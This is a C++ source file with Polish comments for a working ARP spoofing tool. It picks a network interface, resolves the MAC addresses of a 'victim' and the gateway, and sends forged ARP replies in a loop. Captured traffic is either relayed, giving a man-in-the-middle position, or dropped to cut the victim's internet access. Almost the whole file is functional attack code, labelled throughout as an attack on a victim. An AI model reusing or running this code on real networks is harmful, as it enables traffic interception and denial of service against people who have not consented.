#include "App.hpp"
#include "PlatformAbstraction.hpp"
#include "NetworkHeaders.hpp"
#include <cstring>
#include <cstdint>
#include <algorithm>
#include <iostream>
#ifdef _WIN32
#include <winsock2.h>
#else
#include <arpa/inet.h>
#endif
#include <cstdio>
#include <chrono>
#include <thread>

// Inicjalizacja statycznej zmiennej singleton
std::unique_ptr<App> App::instance = nullptr;

App::App() : stopFlag(false), isRunning(false) {
	// Inicjalizacja platformowych komponentów
	networkInterface = PlatformFactory::createNetworkInterface();
	rawSocket = PlatformFactory::createRawSocket();
	
	if (!networkInterface || !rawSocket) {
		log(0, "Błąd: Nie można utworzyć komponentów platformowych");
	}
}

App::~App() {
	stopAttack();
}

App& App::getInstance() {
	if (!instance) {
		instance = std::make_unique<App>();
	}
	return *instance;
}

bool App::listInterfaces() {
	if (!networkInterface) {
		log(0, "Błąd: Interfejs sieciowy nie jest dostępny");
		return false;
	}

	auto interfaces = networkInterface->getInterfaces();
	
	if (interfaces.empty()) {
		log(1, "Nie znaleziono żadnych aktywnych interfejsów sieciowych");
		return false;
	}

	log(2, "Dostępne interfejsy sieciowe:");
	
	for (size_t i = 0; i < interfaces.size(); ++i) {
		const auto& iface = interfaces[i];
		
		IPAddress ipAddr(iface.ip);
		IPAddress gatewayAddr(iface.gateway);
		
		std::string ipStr = ipAddr.toString();
		std::string gatewayStr = gatewayAddr.isEmpty() ? "brak" : gatewayAddr.toString();
		
		log(2, std::to_string(i + 1) + ". " + iface.name + "\t" + iface.description);
		log(2, "\t" + ipStr + "/" + std::to_string(iface.prefixLength) + " gw=" + gatewayStr);
	}
	
	return true;
}

bool App::configureAttack(const AttackConfig& config) {
	this->config = config;
	
	// Sprawdź adres IP ofiary
	if (config.victimIp.isEmpty()) {
		log(0, "Błąd: Nieprawidłowy adres IP ofiary");
		return false;
	}
	
	attackInfo.victimIp = config.victimIp;
	
	// Sprawdź adres IP celu (jeśli podany)
	if (!config.targetIp.isEmpty()) {
		attackInfo.targetIp = config.targetIp;
	}
	
	// Znajdź odpowiedni interfejs
	auto interfaces = networkInterface->getInterfaces();
	const NetworkInterface::InterfaceInfo* targetInterface = nullptr;
	
	if (config.interfaceName.empty()) {
		// Automatyczne wykrycie interfejsu
		for (const auto& iface : interfaces) {
			if (!iface.ip.empty() && !iface.gateway.empty()) {
				IPAddress interfaceIp(iface.ip);
				IPAddress gatewayIp(iface.gateway);
				
				// Sprawdź czy ofiara jest w tej samej sieci
				IPAddress mask = IPAddress::fromPrefixLength(iface.prefixLength);
				if (config.victimIp.isInSameNetwork(interfaceIp, mask)) {
					targetInterface = &iface;
					break;
				}
			}
		}
	} else {
		// Znajdź interfejs po nazwie
		for (const auto& iface : interfaces) {
			if (iface.name == config.interfaceName) {
				targetInterface = &iface;
				break;
			}
		}
	}
	
	if (!targetInterface) {
		log(0, "Błąd: Nie można znaleźć odpowiedniego interfejsu sieciowego");
		return false;
	}
	
	attackInfo.interfaceName = targetInterface->name;
	attackInfo.myMac = targetInterface->mac;
	
	// Jeśli nie podano celu, użyj bramy domyślnej
	if (attackInfo.targetIp.isEmpty()) {
		attackInfo.targetIp = IPAddress(targetInterface->gateway);
	}
	
	// Rozstrzygnij adresy MAC
	log(2, "Rozstrzyganie adresów MAC...");
	
	attackInfo.victimMac = networkInterface->resolveMacAddress(
		attackInfo.interfaceName, attackInfo.victimIp.toBytes());
	if (attackInfo.victimMac.empty()) {
		log(0, "Błąd: Nie można rozstrzygnąć adresu MAC ofiary");
		return false;
	}
	
	attackInfo.targetMac = networkInterface->resolveMacAddress(
		attackInfo.interfaceName, attackInfo.targetIp.toBytes());
	if (attackInfo.targetMac.empty()) {
		log(0, "Błąd: Nie można rozstrzygnąć adresu MAC celu");
		return false;
	}
	
	// Otwórz raw socket
	if (!rawSocket->open(attackInfo.interfaceName, true)) {
		log(0, "Błąd: Nie można otworzyć raw socket.");
		log(0, "Wymagane uprawnienia administratora dla:");
		log(0, "  - Raw socket access (wysyłanie pakietów ARP)");
		log(0, "  - Promiscuous mode (przechwytywanie ruchu sieciowego)");
#ifdef _WIN32
		log(0, "Uruchom program jako Administrator!");
#else
		log(0, "Uruchom program z sudo lub ustaw capabilities!");
#endif
		return false;
	}
	
	log(2, "Konfiguracja ataku zakończona pomyślnie");
	return true;
}

bool App::startAttack() {
	if (attackInfo.victimIp.isEmpty() || attackInfo.targetIp.isEmpty()) {
		log(0, "Błąd: Atak nie został skonfigurowany");
		return false;
	}
	
	// Przygotuj pakiety ARP
	auto arpSpoofVictim = createArpPacket(attackInfo.victimIp, attackInfo.victimMac, 
	                                     attackInfo.targetIp, attackInfo.myMac);
	auto arpSpoofTarget = createArpPacket(attackInfo.targetIp, attackInfo.targetMac, 
	                                     attackInfo.victimIp, attackInfo.myMac);
	
	// Wyświetl informacje o ataku
	if (config.dropMode) {
		log(2, "PORZUCAJĄC pakiety między " + attackInfo.victimIp.toString() + " <---> " + attackInfo.targetIp.toString());
		log(2, "UWAGA: To odetnie internet między urządzeniami!");
	} else {
		log(2, "Przekierowywanie " + attackInfo.victimIp.toString() + " ---> " + attackInfo.targetIp.toString());
	}
	
	if (!config.oneWayMode) {
		log(2, "\toraz w przeciwnym kierunku");
	}
	
	log(2, "Naciśnij Ctrl+C aby zatrzymać");
	
	// Główna pętla ataku
	isRunning = true;
	stopFlag = false;
	attackInfo.isActive = true;
	attackInfo.packetsSent = 0;
	attackInfo.packetsReceived = 0;
	attackInfo.packetsDropped = 0;
	
	auto nextArpTime = std::chrono::steady_clock::now();
	auto nextStatsTime = std::chrono::steady_clock::now();
	int arpInterval = config.arpInterval > 0 ? config.arpInterval : 2;
	
	while (!stopFlag) {
		auto now = std::chrono::steady_clock::now();
		
		// Wysyłaj pakiety ARP w określonych interwałach
		if (now >= nextArpTime) {
			nextArpTime = now + std::chrono::seconds(arpInterval);
			
			if (!rawSocket->sendPacket(arpSpoofVictim)) {
				log(1, "Błąd wysyłania pakietu ARP do ofiary");
			} else {
				attackInfo.packetsSent++;
			}
			
			if (!config.oneWayMode) {
				if (!rawSocket->sendPacket(arpSpoofTarget)) {
					log(1, "Błąd wysyłania pakietu ARP do celu");
				} else {
					attackInfo.packetsSent++;
				}
			}
		}
		
		// Wyświetlaj statystyki co 10 sekund
		if (now >= nextStatsTime) {
			nextStatsTime = now + std::chrono::seconds(10);
			if (config.dropMode) {
				log(2, "Statystyki: Wysłano " + std::to_string(attackInfo.packetsSent) + 
				     " ARP, Odebrano " + std::to_string(attackInfo.packetsReceived) + 
				     ", Porzucono " + std::to_string(attackInfo.packetsDropped) + " pakietów");
			} else {
				log(2, "Statystyki: Wysłano " + std::to_string(attackInfo.packetsSent) + 
				     " ARP, Odebrano " + std::to_string(attackInfo.packetsReceived) + " pakietów");
			}
		}
		
		// Próba odbioru pakietów
		auto receivedPacket = rawSocket->receivePacket();
		
		if (!receivedPacket.empty()) {
			handlePacket(receivedPacket);
			attackInfo.packetsReceived++;
		}
		
		// Krótka przerwa aby nie obciążać CPU
		std::this_thread::sleep_for(std::chrono::milliseconds(1));
	}
	
	isRunning = false;
	attackInfo.isActive = false;
	
	if (stopCallback) {
		stopCallback();
	}
	
	return true;
}

void App::stopAttack() {
	if (!isRunning) return;
	
	log(2, "Zatrzymywanie ataku...");
	
	// Przygotuj prawidłowe pakiety ARP
	auto arpSpoofVictim = createArpPacket(attackInfo.victimIp, attackInfo.victimMac, 
	                                     attackInfo.targetIp, attackInfo.targetMac);
	auto arpSpoofTarget = createArpPacket(attackInfo.targetIp, attackInfo.targetMac, 
	                                     attackInfo.victimIp, attackInfo.victimMac);
	
	// Wyślij prawidłowe pakiety kilka razy
	for (int i = 0; i < 3; ++i) {
		rawSocket->sendPacket(arpSpoofVictim);
		if (!config.oneWayMode) {
			rawSocket->sendPacket(arpSpoofTarget);
		}
	}
	
	rawSocket->close();
	isRunning = false;
	
	// Wyświetl końcowe statystyki
	if (config.dropMode) {
		log(2, "Atak zakończony. Statystyki końcowe:");
		log(2, "  - Wysłano pakietów ARP: " + std::to_string(attackInfo.packetsSent));
		log(2, "  - Odebrano pakietów: " + std::to_string(attackInfo.packetsReceived));
		log(2, "  - Porzucono pakietów: " + std::to_string(attackInfo.packetsDropped));
		log(2, "  - Internet został odcięty na " + std::to_string(attackInfo.packetsDropped) + " pakietów");
	} else {
		log(2, "Atak zakończony. Statystyki końcowe:");
		log(2, "  - Wysłano pakietów ARP: " + std::to_string(attackInfo.packetsSent));
		log(2, "  - Przekazano pakietów: " + std::to_string(attackInfo.packetsReceived));
	}
	
	log(2, "Atak zatrzymany");
}

std::vector<uint8_t> App::createArpPacket(
    const IPAddress& victimIp,
    const std::vector<uint8_t>& victimMac,
    const IPAddress& spoofedIp,
    const std::vector<uint8_t>& myMac
) {
    std::vector<uint8_t> packet(42); // Ethernet header (14) + ARP header (28)

    // Ethernet header
    EthernetHeader* eth = reinterpret_cast<EthernetHeader*>(packet.data());
    std::memcpy(eth->dest, victimMac.data(), 6);
    std::memcpy(eth->src, myMac.data(), 6);
    eth->type = htons(0x0806); // ARP

    // ARP header
    ArpHeader* arp = reinterpret_cast<ArpHeader*>(packet.data() + 14);
    arp->hardware_type = htons(1); // Ethernet
    arp->protocol_type = htons(0x0800); // IPv4
    arp->hardware_size = 6;
    arp->protocol_size = 4;
    arp->opcode = htons(2); // ARP Reply

    std::memcpy(arp->sender_mac, myMac.data(), 6);
    std::memcpy(arp->sender_ip, spoofedIp.toBytes().data(), 4);
    std::memcpy(arp->target_mac, victimMac.data(), 6);
    std::memcpy(arp->target_ip, victimIp.toBytes().data(), 4);

    return packet;
}

void App::handlePacket(const std::vector<uint8_t>& data) {
	if (data.size() < sizeof(EthernetHeader) + sizeof(IpHeader)) {
		return;
	}
	
	EthernetHeader* eth = reinterpret_cast<EthernetHeader*>(const_cast<uint8_t*>(data.data()));
	if (htons(eth->type) != 0x0800) {
		return; // Nie IP
	}
	
	// Sprawdź czy pakiet pochodzi od ofiary lub celu
	if ((std::memcmp(eth->src, attackInfo.victimMac.data(), 6) != 0 && 
	     std::memcmp(eth->src, attackInfo.targetMac.data(), 6) != 0) || 
	    std::memcmp(eth->dest, attackInfo.myMac.data(), 6) != 0) {
		return;
	}
	
	IpHeader* ip = reinterpret_cast<IpHeader*>(const_cast<uint8_t*>(data.data() + sizeof(EthernetHeader)));
	IPAddress srcIp(reinterpret_cast<uint8_t*>(&ip->src));
	IPAddress dstIp(reinterpret_cast<uint8_t*>(&ip->dest));
	
	if (srcIp != attackInfo.victimIp && dstIp != attackInfo.victimIp) {
		return;
	}
	
	// W trybie dropMode porzuć pakiet zamiast go przekazywać
	if (config.dropMode) {
		attackInfo.packetsDropped++;
		return; // Porzuć pakiet - nie przekazuj dalej
	}
	
	// Przekaż pakiet (tryb normalny)
	std::vector<uint8_t> newPacket = data;
	EthernetHeader* newEth = reinterpret_cast<EthernetHeader*>(newPacket.data());
	
	if (std::memcmp(eth->src, attackInfo.victimMac.data(), 6) == 0) {
		std::memcpy(newEth->dest, attackInfo.targetMac.data(), 6);
		std::memcpy(newEth->src, attackInfo.myMac.data(), 6);
	} else {
		std::memcpy(newEth->dest, attackInfo.victimMac.data(), 6);
		std::memcpy(newEth->src, attackInfo.myMac.data(), 6);
	}
	
	rawSocket->sendPacket(newPacket);
}

void App::log(int level, const std::string& message) {
	if (logCallback) {
		logCallback(level, message);
	} else {
		const char* levelStr[] = {"ERROR", "WARN", "INFO", "DEBUG"};
		if (level >= 0 && level < 4) {
			std::cerr << "[" << levelStr[level] << "] " << message << std::endl;
		}
	}
} 